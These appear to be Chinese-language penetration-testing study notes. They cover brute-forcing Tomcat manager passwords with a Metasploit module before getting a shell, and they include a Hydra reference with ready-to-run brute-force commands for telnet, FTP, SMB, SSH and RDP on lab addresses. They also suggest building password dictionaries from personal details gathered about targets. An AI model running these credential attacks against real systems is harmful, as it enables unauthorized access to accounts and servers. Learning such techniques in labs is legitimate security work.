## Tomcat后台弱口令爆破getshell

![image-20221009142413873](Tomcat%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4getshell.assets/image-20221009142413873.png)

找到登录地址:http://172.16.105.192:48604/

kali中打开MSF

搜索tomcat利用脚本:`search tomcat `

![image-20221009142628794](Tomcat%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4getshell.assets/image-20221009142628794.png)

使用auxiliary/scanner/http/tomcat_mgr_login 模块进行tomcat弱口令爆破:`use auxiliary/scanner/http/tomcat_mgr_login`

查看需要设置的参数:`show options`

![image-20221009142757508](Tomcat%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4getshell.assets/image-20221009142757508.png)



先用默认字典尝试,只需要设置远程主机rhosts和远程端口rport即可

```bash
set rhosts 172.16.105.192
set rport 48604/
```

![image-20221009143023055](Tomcat%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4getshell.assets/image-20221009143023055.png)



开始爆破

```bash
run或者exploit都可
```

![image-20221009143126541](Tomcat%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4getshell.assets/image-20221009143126541.png)

成功拿到密码



如果默认字典无法爆出密码,则可以使用自己构建的字典

```
如果用桌面上字典 则需要设置set PASS_FILE ‘root/Desktop/password.txt’
set USER_FILE ‘root/Desktop/user.txt’
```

获取到密码后即可登录后台getshell

## 网络服务弱口令爆破

在线爆破受网络因素、字典、电脑性能影响较大。扫描端口分析服务进行爆破攻击：smb、telnet、ftp、rdp、mysql、mssql、ssh

#### Hydra九头蛇

> 参考链接:https://blog.csdn.net/u012206617/article/details/86306358

- -l 指定单个用户名，适合在知道用户名爆破用户名密码时使用
- -L 指定多个用户名，参数值为存储用户名的文件的路径(建议为绝对路径)
- -p 指定单个密码，适合在知道密码爆破用户名时使用
- -P 指定多个密码，参数值为存贮密码的文件(通常称为字典)的路径(建议为绝对路径)
- -C 当用户名和密码存储到一个文件时使用此参数。注意，文件(字典)存储的格式必须为 “用户名:密码” 的格式。
- -M 指定多个攻击目标，此参数为存储攻击目标的文件的路径(建议为绝对路径)。注意：列表文件存储格式必须为 “地址:端口”
- -t 指定爆破时的任务数量(可以理解为线程数)，默认为16
- -s 指定端口，适用于攻击目标端口非默认的情况。例如：http服务使用非80端口
- -S 指定爆破时使用 SSL 链接
- -R 继续从上一次爆破进度上继续爆破
- -v/-V 显示爆破的详细信息
- -f 一但爆破成功一个就停止爆破
- server 代表要攻击的目标(单个)，多个目标时请使用 -M 参数
- service 攻击目标的服务类型(可以理解为爆破时使用的协议)，例如 http，在hydra中，不同协议会使用不同的模块来爆破，hydra的http-get 和 http-post 模块就用来爆破基于 get 和 post 请求的页面
- OPT 爆破模块的额外参数，可以使用 -U 参数来查看模块支持那些参数，例如命令：hydra -U http-get

#### Hydra命令行爆破

##### Hydra爆破telnet

```
hydra -L /root/dict/usename.txt -P /root/dict/password.txt -t 20 telnet://192.168.198.133:23
```

##### Hydra爆破ftp

```
hydra -L /root/dict/usename.txt -P /root/dict/password.txt -t 20 ftp://192.168.198.133:21
```

##### Hydra爆破smb

```
hydra -L /root/dict/usename.txt -P /root/dict/password.txt -t 20 smb://192.168.198.133:445
```

##### Hydra爆破ssh

```
hydra -L /root/dict/usename.txt -P /root/dict/password.txt -t 20 ssh://192.168.198.131:22
```

##### Hydra爆破rdp

```
hydra -L /root/dict/usename.txt -P /root/dict/password.txt -t 20 rdp://192.168.198.133:3389
```

## 社工字段生成器

社工字段生成工具可以根据收集到的社工信息生成相对应的密码字典,比如姓名、生日、特殊日子、邮箱、公司等等,可以使用图形化字典生成器输入相应数据直接生成